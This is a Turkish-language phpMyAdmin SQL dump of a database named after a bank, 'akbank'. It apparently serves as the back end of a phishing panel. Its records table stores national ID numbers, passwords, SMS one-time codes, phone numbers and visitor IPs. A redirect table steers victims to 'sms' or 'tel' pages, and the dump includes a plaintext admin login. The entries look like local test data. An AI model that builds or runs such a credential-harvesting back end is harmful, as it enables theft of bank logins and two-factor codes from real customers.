-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Anamakine: localhost
-- Üretim Zamanı: 15 Eyl 2024, 12:51:12
-- Sunucu sürümü: 10.4.28-MariaDB
-- PHP Sürümü: 8.2.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `akbank`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` varchar(250) NOT NULL,
  `password` varchar(250) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;

--
-- Tablo döküm verisi `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(1, 'root', 'xx222xx');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `bans`
--

CREATE TABLE `bans` (
  `id` int(11) NOT NULL,
  `ipAddress` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ips`
--

CREATE TABLE `ips` (
  `id` int(11) NOT NULL,
  `ipAddress` varchar(250) NOT NULL,
  `lastOnline` varchar(250) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- Tablo döküm verisi `ips`
--

INSERT INTO `ips` (`id`, `ipAddress`, `lastOnline`) VALUES
(2, '::1', '1720640489'),
(3, '127.0.0.1', '1726397342');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `records`
--

CREATE TABLE `records` (
  `id` int(11) NOT NULL,
  `page` varchar(255) DEFAULT NULL,
  `tc` varchar(255) NOT NULL,
  `kurumsalusername` varchar(255) DEFAULT NULL,
  `pass` varchar(255) NOT NULL,
  `sms` int(11) DEFAULT NULL,
  `ajaxsms` varchar(250) DEFAULT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `os` varchar(255) DEFAULT NULL,
  `lastOnline` varchar(255) NOT NULL,
  `tel` varchar(255) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- Tablo döküm verisi `records`
--

INSERT INTO `records` (`id`, `page`, `tc`, `kurumsalusername`, `pass`, `sms`, `ajaxsms`, `ipAddress`, `os`, `lastOnline`, `tel`) VALUES
(33, 'Bekleme Sayfası', '', NULL, '', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(32, 'Bekleme Sayfası', '', NULL, '', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(28, 'Bekleme Sayfası', '', NULL, '', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(29, 'Bekleme Sayfası', '', NULL, '', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(30, 'Bekleme Sayfası', '', NULL, '', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(27, 'Bekleme Sayfası', '1562357135', NULL, '666666', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(26, 'Bekleme Sayfası', '13262578912', NULL, '222111', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(31, 'Bekleme Sayfası', '', NULL, '', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(25, 'Bekleme Sayfası', '12313212412', NULL, '124124', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(24, 'Bekleme Sayfası', '12431241241', NULL, '241241', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(21, 'Bekleme Sayfası', '14053207552', NULL, '222222', NULL, NULL, '::1', NULL, '1725641470', '12124142412'),
(22, 'Bekleme Sayfası', '14053207552', NULL, '124124', NULL, NULL, '::1', NULL, '1725641470', '12124142412'),
(23, 'Bekleme Sayfası', '14124124142', NULL, '124124', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(19, 'Bekleme Sayfası', '14053207552', NULL, '123123', 222222, '222222', '127.0.0.1', NULL, '1726397342', '5443332211'),
(34, 'Bekleme Sayfası', '123123123114', NULL, '666666', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(35, 'Bekleme Sayfası', '', NULL, '', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(36, 'Bekleme Sayfası', '123141241', NULL, '12412414', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(37, 'Bekleme Sayfası', '', NULL, '', 222222, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(38, 'Bekleme Sayfası', '12312312311', NULL, '12312312311', NULL, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(39, 'Bekleme Sayfası', '12312312311', NULL, '123123', NULL, NULL, '127.0.0.1', NULL, '1726397342', '5443332211'),
(40, 'Bekleme Sayfası', '', NULL, '', NULL, NULL, '127.0.0.1', NULL, '1726397342', '5443332211');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `redirect`
--

CREATE TABLE `redirect` (
  `id` int(11) NOT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `page` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- Tablo döküm verisi `redirect`
--

INSERT INTO `redirect` (`id`, `ipAddress`, `page`) VALUES
(46, '178.240.62.168', 'basadondur'),
(96, 'undefined', 'basadondur'),
(97, 'undefined', 'basadondur'),
(98, 'undefined', 'basadondur'),
(99, 'undefined', 'sms'),
(100, 'undefined', 'sms'),
(101, 'undefined', 'sms'),
(102, 'undefined', 'sms'),
(103, 'undefined', 'basadondur'),
(104, 'undefined', 'sms'),
(105, 'undefined', 'tel'),
(106, 'undefined', 'basadondur'),
(107, 'undefined', 'sms'),
(108, '\' . $record[\'ipAddress\'] . \'', 'basadondur'),
(110, '\' . $record[\'ipAddress\'] . \'', 'sms');

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `bans`
--
ALTER TABLE `bans`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `ips`
--
ALTER TABLE `ips`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `records`
--
ALTER TABLE `records`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `redirect`
--
ALTER TABLE `redirect`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `bans`
--
ALTER TABLE `bans`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `ips`
--
ALTER TABLE `ips`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- Tablo için AUTO_INCREMENT değeri `records`
--
ALTER TABLE `records`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=41;

--
-- Tablo için AUTO_INCREMENT değeri `redirect`
--
ALTER TABLE `redirect`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=130;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
